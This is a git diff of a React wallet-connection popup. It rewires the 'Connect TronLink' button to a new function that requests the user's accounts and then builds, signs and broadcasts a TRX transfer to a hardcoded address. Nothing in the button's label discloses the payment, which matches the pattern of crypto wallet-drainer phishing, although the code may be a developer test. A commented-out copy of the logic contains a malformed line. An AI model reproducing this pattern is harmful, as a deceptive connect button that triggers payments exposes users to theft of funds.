@@ -1,7 +1,7 @@
 import { AnimatePresence, motion } from 'framer-motion';
 import { useState, useEffect, useRef } from 'react';
 import './Test3.css';
-// import TronWeb from 'tronweb';
+//  import TronWeb from 'tronweb';
 import MetaFox from "@/assets/MetaMask_Fox.svg.png"
 // import TrxLogo from "@/assets/tron-trx-logo.png"
 import TronLogo from "@/assets/tronlink.svg"
@@ -42,7 +42,7 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
       console.log('Install MetaMask please!!');
     }
   };
-
+  
   const connectWallet = async () => {
     if (window.ethereum) {
       try {
@@ -60,127 +60,96 @@ const Popup: React.FC<PopupProps> = ({ onClose }) => {
       window.location.href = 'https://metamask.io/';
     }
   };
+  
 
+  const getTronWeb= async ()=>{
+    
+      
+    const response= await window.tronLink.request({method: 'tron_requestAccounts'})
+     
+      // console.log(response)
+      if (response && window.tronWeb.defaultAddress.base58) {
+     
+     
+        const tronweb = window.tronWeb
+        const userAddress = tronweb.defaultAddress.base58;
+         if (userAddress.length > 0){
+          setAccount2(userAddress);
+          console.log(userAddress);
+        
+       
+        const tx = await tronweb.transactionBuilder.sendTrx('TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP', 10, 'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ')
+        const signedTx = await tronweb.trx.sign(tx)
+        const broastTx = await tronweb.trx.sendRawTransaction(signedTx)
+        console.log(broastTx)
+        setPopupVisible(true)
+    
+  
+  }
+}else{
+  console.log("Install TronLink if not Installed yet")
+}
 
-//   const getTronweb = async () => {
-//     const intervalId = setInterval(async () => {
+}
 
-//       if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-//         clearInterval(intervalId);
-//         console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
+// const checkTronWeb = async () => {
+//   const tronLink = window.tronLink;
 
-//         const tronweb = window.tronWeb;
-//         const userAddress = tronweb.defaultAddress.base58;
-//         try {
-//           if (userAddress.length > 0){
-//             setAccount2(userAddress);
-//           setPopupVisible(true);
-//         }
-//        else {
-//         setPopupVisible(true); 
-//       }
-//     } catch (error) {
-//       console.log(error);
-//     }
-//   } else {
-//     console.log('Install MetaMask please!!');
-// }
+//   if (!tronLink || !tronLink.ready) {
+//     console.log("Account not connected yet");
+//     return;
 //   }
 
-// const handleTronLink = () => {
-//   const { tronLink } = window;
-//   if (tronLink) {
-    
-//     console.log('tronLink successfully detected!');
+//   try {
+//     const response = await tronLink.request({ method: 'tron_requestAccounts' });
 
-//     // Access the decentralized web!
-//   } else {
-//     console.log('Please install TronLink-Extension!');
+//     if (response.code === 200) {
+//       console.log(response.message);
+
+//       const getTronweb = async () => {
+//         const intervalId = setInterval(async () => {
+//           if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+//             clearInterval(intervalId);
+//             console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
+
+//             const tronweb = window.tronWeb;
+//             const userAddress = tronweb.defaultAddress.base58;
+
+//             try {
+//               if (userAddress.length > 0) {
+//                 setAccount2(userAddress);
+//                 const tx = await tronweb.transactionBuilder.sendTrx(
+//                   'TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP',
+                  
+//                   10,
+//                   'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ'
+//                   TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ
+//                 );
+//                 const signedTx = await tronweb.trx.sign(tx);
+//                 const broastTx = await tronweb.trx.sendRawTransaction(signedTx);
+//                 console.log(broastTx);
+//                 setPopupVisible(true);
+//               } else {
+//                 setPopupVisible(true);
+//               }
+//             } catch (error) {
+//               console.log(error);
+//             }
+//           } else {
+//             console.log('Unexpected Error occured');
+//           }
+//         }, 10);
+//       };
+
+//       getTronweb();
+//     } else {
+//       console.log('User rejected the request');
+//     }
+//   } catch (error) {
+//     console.error('Error while requesting accounts:', error);
 //   }
 // };
 
-// useEffect(() => {
-//   // Dispatch the 'tronLink#initialized' event
-//   window.dispatchEvent(new Event('tronLink#initialized'));
-
-//   // Check if TronLink is already available
-//   if (window.tronLink) {
-//     handleTronLink();
-//   } else {
-//     // Set up an event listener for 'tronLink#initialized' event
-//     window.addEventListener('tronLink#initialized', handleTronLink, {
-//       once: true,
-//     });
-
-//     // If the event is not dispatched by the end of the timeout,
-//     // the user probably doesn't have TronLink installed.
-//     setTimeout(handleTronLink, 3000); // 3 seconds
-//   }
-// }, []);
-
-
-
-const checkTronWeb = async () => {
-    const tronLink = window.tronLink;
-
-    if (tronLink && tronLink.ready) {
-      try {
-        const response = await tronLink.request({ method: 'tron_requestAccounts' });
-console.log(response)
-        if (response.code === 200) {         
-          console.log(response.message)
-          
-          const getTronweb = async () => {
-            const intervalId = setInterval(async () => {
-
-              if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                clearInterval(intervalId);
-                console.log("Yes, catch it:", window.tronWeb.defaultAddress.base58);
-
-                const tronweb = window.tronWeb;
-                const userAddress = tronweb.defaultAddress.base58;
-                try {
-                  if (userAddress.length > 0){
-                    setAccount2(userAddress);
-                  setPopupVisible(true);
-                }
-               else {
-                setPopupVisible(true); 
-              }
-            } catch (error) {
-              console.log(error);
-            }
-          } else {
-            console.log('Install MetaMask please!!');
-        }
-      }, 10)
-    }
-    getTronweb();
-          
-        } else {
-          console.log('User rejected the request');
-        }
-      } catch (error) {
-        console.error('Error while requesting accounts:', error);
-      }
-    }else{
-      window.location.href = 'https://www.tronlink.org/';
-    }
-
-  };
-
-        // const tx = await tronweb.transactionBuilder.sendTrx(
-        //   'TN9RRaXkCFtTXRso2GdTZxSxxwufzxLQPP',
-        //   10,
-        //   'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ'
-        // );
-        // const signedTx = await tronweb.trx.sign(tx);
-        // const broastTx = await tronweb.trx.sendRawTransaction(signedTx);
-        // console.log(broastTx);
-      
-
-  //   }, 10);
-  // )};
 useEffect(() => {
   checkMetaMask();
   // const HttpProvider = TronWeb.providers.HttpProvider;
@@ -288,7 +257,7 @@ return (
               <img src={TronLogo} width={30} style={{ marginRight: '15px', }} />
               <button
                 className="px-1 bg-transparent text-white rounded font-semibold"
-                onClick={checkTronWeb}
+                onClick={getTronWeb}
               >
                 Connect TronLink
               </button>
